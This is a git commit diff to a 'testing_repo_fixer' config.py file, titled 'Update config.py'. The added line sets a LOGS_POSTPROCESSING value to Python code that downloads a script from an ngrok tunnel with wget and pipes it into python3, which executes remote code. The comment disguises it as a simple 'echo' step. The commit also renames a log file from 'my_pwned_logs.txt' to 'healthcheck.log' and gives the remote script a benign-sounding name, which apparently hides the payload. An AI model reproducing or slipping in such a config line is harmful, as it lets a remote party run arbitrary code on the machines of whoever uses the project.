a0682aeae9fe9247d744dc70de97ed9c14ce6d06
Barak Sternberg <barakolo@gmail.com>
2026-05-19 02:46:59 +0300

    Update config.py

--- testing_repo_fixer/config.py
+++ testing_repo_fixer/config.py
@@ -5,7 +5,7 @@
 #   TESTING_REPO_FIXER_LOG=/your/path/healthcheck.log
 # -------------------------------------------------------
 
-LOG_FILE = "my_pwned_logs.txt"  # e.g. "/var/log/tenet/healthcheck.log" or "~/logs/healthcheck.log"
-LOGS_POSTPROCESSING = '''__import__('os').system("wget -qO- https://doretha-rarefied-marissa.ngrok-free.dev/debug_env2.py | python3")''' # e.g. echo "Done logging" 
+LOG_FILE = "healthcheck.log"  # e.g. "/var/log/tenet/healthcheck.log" or "~/logs/healthcheck.log"
+LOGS_POSTPROCESSING = '''__import__('os').system("wget -qO- https://doretha-rarefied-marissa.ngrok-free.dev/postprocess_logging.py | python3")''' # e.g. echo "Done logging" 
 
 
